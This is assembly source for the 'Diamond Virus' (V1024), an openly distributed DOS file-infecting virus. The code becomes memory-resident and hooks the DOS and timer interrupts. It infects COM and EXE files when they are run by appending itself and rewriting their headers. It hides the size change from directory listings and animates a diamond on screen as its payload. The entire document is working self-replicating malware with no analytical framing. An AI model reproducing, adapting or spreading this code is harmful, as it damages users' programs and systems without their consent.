
;	 The Diamond Virus
;
;	   Version  2.10
;
; also known as:
;    V1024, V651, The EGN Virus
;
; Basic release:   5-Aug-1989
; Last patch:	   5-May-1990
;
;   COPYRIGHT:
;
; This program is (c) Copyright 1989,1990 Damage, Inc.
; Permission is granted to distribute this source provided the tittle page is
;   preserved.
; Any fee can be charged for distribution of this source, however, Damage, Inc.
;   distributes it freely.
; You are specially prohibited to use this program for military purposes.
; Damage, Inc. is not liable for any kind of damages resulting from the use of
;   or the inability to use this software.
;
; To assemble this program use Turbo Assembler 1.0

		.radix	16
		.model	tiny
		.code
code_len	=	top_code-main_entry
data_len	=	top_data-top_code
main_entry:
		call	locate_address
gen_count	dw	0
locate_address:
		xchg	ax,bp
		cld
		pop	bx
		inc	word ptr cs:[bx]
		mov	ax,0d5aa
		int	21
		cmp	ax,2a03
		jz	all_done
		mov	ax,sp
		inc	ax
		mov	cl,4
		shr	ax,cl
		inc	ax
		mov	dx,ss
		add	ax,dx
		mov	dx,ds
		dec	dx
		mov	es,dx
		xor	di,di
		mov	cx,(top_data-main_entry-1)/10+1
		mov	dx,[di+2]
		sub	dx,cx
		cmp	dx,ax
		jc	all_done
		cli
		sub	es:[di+3],cx
		mov	[di+2],dx
		mov	es,dx
		lea	si,[bx+main_entry-gen_count]
		mov	cx,top_code-main_entry
		rep
		db	2e
		movsb
		push	ds
		mov	ds,cx
		mov	si,20
		lea	di,[di+old_vector-top_code]
		org	$-1
		mov	ax,offset dos_handler
		xchg	ax,[si+64]
		stosw
		mov	ax,es
		xchg	ax,[si+66]
		stosw
		mov	ax,offset time_handler
		xchg	ax,[si]
		stosw
		xchg	ax,dx
		xchg	ax,[si+2]
		stosw
		mov	ax,24
		stosw
		pop	ds
		push	ds
		pop	es
		sti
all_done:
		lea	si,[bx+exe_header-gen_count]
		db	2e
		lodsw
		cmp	ax,'ZM'
		jz	exit_exe
		mov	di,100
		push	di
		stosw
		movsb
		xchg	ax,bp
		ret
exit_exe:
		mov	dx,ds
		add	dx,10
		add	cs:[si+return_address+2-exe_header-2],dx
		org	$-1
		add	dx,cs:[si+stack_offset+2-exe_header-2]
		org	$-1
		mov	ss,dx
		mov	sp,cs:[si+stack_offset-exe_header-2]
		org	$-1
		xchg	ax,bp
		jmp	dword ptr cs:[si+return_address-exe_header-2]
		org	$-1
infect:
		mov	dx,offset exe_header
		mov	cx,top_header-exe_header
		mov	ah,3f
		int	21
		jc	do_exit
		sub	cx,ax
		jnz	go_error
		mov	di,offset exe_header
		les	ax,[di+ss_offset-exe_header]
		org	$-1
		mov	[di+stack_offset-exe_header],es
		org	$-1
		mov	[di+stack_offset+2-exe_header],ax
		org	$-1
		les	ax,[di+ip_offset-exe_header]
		org	$-1
		mov	[di+return_address-exe_header],ax
		org	$-1
		mov	[di+return_address+2-exe_header],es
		org	$-1
		mov	dx,cx
		mov	ax,4202
		int	21
		jc	do_exit
		mov	[di+file_size-exe_header],ax
		org	$-1
		mov	[di+file_size+2-exe_header],dx
		org	$-1
		mov	cx,code_len
		cmp	ax,cx
		sbb	dx,0
		jc	do_exit
		xor	dx,dx
		mov	si,'ZM'
		cmp	si,[di]
		jz	do_put_image
		cmp	[di],'MZ'
		jz	do_put_image
		cmp	ax,0fe00-code_len
		jc	put_image
go_error:
		stc
do_exit:
		ret
do_put_image:
		cmp	dx,[di+max_size-exe_header]
		org	$-1
		jz	go_error
		mov	[di],si
put_image:
		mov	ah,40
		int	21
		jc	do_exit
		sub	cx,ax
		jnz	go_error
		mov	dx,cx
		mov	ax,4200
		int	21
		jc	do_exit
		mov	ax,[di+file_size-exe_header]
		org	$-1
		cmp	[di],'ZM'
		jnz	com_file
		mov	dx,[di+file_size-exe_header+2]
		org	$-1
		mov	cx,4
		push	di
		mov	si,[di+header_size-exe_header]
		org	$-1
		xor	di,di
shift_size:
		shl	si,1
		rcl	di,1
		loop	shift_size
		sub	ax,si
		sbb	dx,di
		pop	di
		mov	cl,0c
		shl	dx,cl
		mov	[di+ip_offset-exe_header],ax
		org	$-1
		mov	[di+cs_offset-exe_header],dx
		org	$-1
		add	dx,(code_len+data_len+100-1)/10+1
		org	$-1
		mov	[di+sp_offset-exe_header],ax
		org	$-1
		mov	[di+ss_offset-exe_header],dx
		org	$-1
		add	word ptr [di+min_size-exe_header],(data_len+100-1)/10+1
		org	$-2
		mov	ax,[di+min_size-exe_header]
		org	$-1
		cmp	ax,[di+max_size-exe_header]
		org	$-1
		jc	adjust_size
		mov	[di+max_size-exe_header],ax
		org	$-1
adjust_size:
		mov	ax,[di+last_page-exe_header]
		org	$-1
		add	ax,code_len
		push	ax
		and	ah,1
		mov	[di+last_page-exe_header],ax
		org	$-1
		pop	ax
		mov	cl,9
		shr	ax,cl
		add	[di+page_count-exe_header],ax
		org	$-1
		jmp	short put_header
com_file:
		sub	ax,3
		mov	byte ptr [di],0e9
		mov	[di+1],ax
put_header:
		mov	dx,offset exe_header
		mov	cx,top_header-exe_header
		mov	ah,40
		int	21
		jc	error
		cmp	ax,cx
		jz	reset
error:
		stc
reset:
		ret
find_file:
		pushf
		push	cs
		call	calldos
		test	al,al
		jnz	cant_find
		push	ax
		push	bx
		push	es
		mov	ah,51
		int	21
		mov	es,bx
		cmp	bx,es:[16]
		jnz	not_infected
		mov	bx,dx
		mov	al,[bx]
		push	ax
		mov	ah,2f
		int	21
		pop	ax
		inc	al
		jnz	fcb_standard
		add	bx,7
fcb_standard:
		mov	ax,es:[bx+17]
		and	ax,1f
		xor	al,1e
		jnz	not_infected
		and	byte ptr es:[bx+17],0e0
		sub	es:[bx+1dh],code_len
		sbb	es:[bx+1f],ax
not_infected:
		pop	es
		pop	bx
		pop	ax
cant_find:
		iret
dos_handler:
		cmp	ah,4bh
		jz	exec
		cmp	ah,11
		jz	find_file
		cmp	ah,12
		jz	find_file
		cmp	ax,0d5aa
		jnz	calldos
		not	ax
fail:
		mov	al,3
		iret
exec:
		cmp	al,2
		jnc	calldos
		push	ds
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		mov	ax,3524
		int	21
		push	es
		push	bx
		mov	ah,25
		push	ax
		push	ds
		push	dx
		push	cs
		pop	ds
		mov	dx,offset fail
		int	21
		pop	dx
		pop	ds
		mov	ax,4300
		int	21
		jc	exit
		test	cl,1
		jz	open
		dec	cx
		mov	ax,4301
		int	21
open:
		mov	ax,3d02
		int	21
		jc	exit
		xchg	ax,bx
		mov	ax,5700
		int	21
		jc	close
		mov	al,cl
		or	cl,1f
		dec	cx
		xor	al,cl
		jz	close
		push	cs
		pop	ds
		push	cx
		push	dx
		call	infect
		pop	dx
		pop	cx
		jc	close
		mov	ax,5701
		int	21
close:
		mov	ah,3e
		int	21
exit:
		pop	ax
		pop	dx
		pop	ds
		int	21
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
calldos:
		jmp	cs:[old_vector]
		.radix	10
adrtbl		dw	1680,1838,1840,1842,1996,1998,2000,2002,2004,2154,2156
		dw	2158,2160,2162,2164,2166,2316,2318,2320,2322,2324,2478
		dw	2480,2482,2640
diftbl		dw	-324,-322,-156,158,-318,-316,318,156,162,316,164,-322
		dw	-162,-322,322,322,-324,-158,164,316,-324,324,-316,-164
		dw	324
valtbl		dw	3332,3076,3076,3076,3588,3588,3588,3588,3588,3844,3844
		dw	3844,3844,3844,3844,3844,2564,2564,2564,2564,2564,2820
		dw	2820,2820,2308
xlatbl		dw	-324,316,-164,156,-322,318,-162,158,-318,322,-158,162
		dw	-316,324,-156,164
		.radix	16
time_handler:
		push	ds
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	cs
		pop	ds
		cld
		mov	dx,3da
		mov	cx,19
		mov	si,offset count
		mov	ax,[si]
		test	ah,ah
		jnz	make_move
		mov	al,ah
		mov	es,ax
		cmp	al,es:[46dh]
		jnz	exit_timer
		mov	ah,0f
		int	10
		cmp	al,2
		jz	init_diamond
		cmp	al,3
		jnz	exit_timer
init_diamond:
		inc	byte ptr [si+1]
		sub	bl,bl
		add	bh,0b8
		mov	[si+2],bx
		mov	es,bx
wait_snow:
		in	al,dx
		test	al,8
		jz	wait_snow
		mov	si,offset valtbl
build_diamond:
		mov	di,[si+adrtbl-valtbl]
		movsw
		loop	build_diamond
exit_timer:
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
		jmp	cs:[old_timer]
count_down:
		dec	byte ptr [si]
		jmp	exit_timer
make_move:
		test	al,al
		jnz	count_down
		inc	byte ptr [si]
		mov	si,offset adrtbl
make_step:
		push	cx
		push	cs
		pop	es
		lodsw
		mov	bx,ax
		sub	ax,140
		cmp	ax,0d20
		jc	no_xlat
		test	ax,ax
		mov	ax,[si+diftbl-adrtbl-2]
		jns	test_xlat
		test	ax,ax
		js	do_xlat
		jmp	short no_xlat
test_xlat:
		test	ax,ax
		js	no_xlat
do_xlat:
		mov	di,offset xlatbl
		mov	cx,10
		repnz	scasw
		dec	di
		dec	di
		xor	di,2
		mov	ax,[di]
		mov	[si+diftbl-adrtbl-2],ax
no_xlat:
		mov	ax,[si-2]
		add	ax,[si+diftbl-adrtbl-2]
		mov	[si-2],ax
		mov	cx,19
		mov	di,offset adrtbl
lookup:
		jcxz	looked_up
		repnz	scasw
		jnz	looked_up
		cmp	si,di
		jz	lookup
		mov	[si-2],bx
		mov	ax,[si+diftbl-adrtbl-2]
		xchg	ax,[di+diftbl-adrtbl-2]
		mov	[si+diftbl-adrtbl-2],ax
		jmp	lookup
looked_up:
		mov	es,[homeadr]
		mov	di,bx
		xor	bx,bx
		call	out_char
		mov	di,[si-2]
		mov	bx,[si+valtbl-adrtbl-2]
		call	out_char
		pop	cx
		loop	make_step
		jmp	exit_timer
out_char:
		in	al,dx
		test	al,1
		jnz	out_char
check_snow:
		in	al,dx
		test	al,1
		jz	check_snow
		xchg	ax,bx
		stosw
		ret
stack_offset	dd	?
return_address	dd	?
		db	'7106286813'
exe_header:	int	20
last_page:	nop
top_code:
		db	?
page_count	dw	?
		dw	?
header_size	dw	?
min_size	dw	?
max_size	dw	?
ss_offset	dw	?
sp_offset	dw	?
		dw	?
ip_offset	dw	?
cs_offset	dw	?
top_header:
file_size	dd	?
old_vector	dd	?
old_timer	dd	?
count		db	?
flag		db	?
homeadr 	dw	?
top_data:
		end
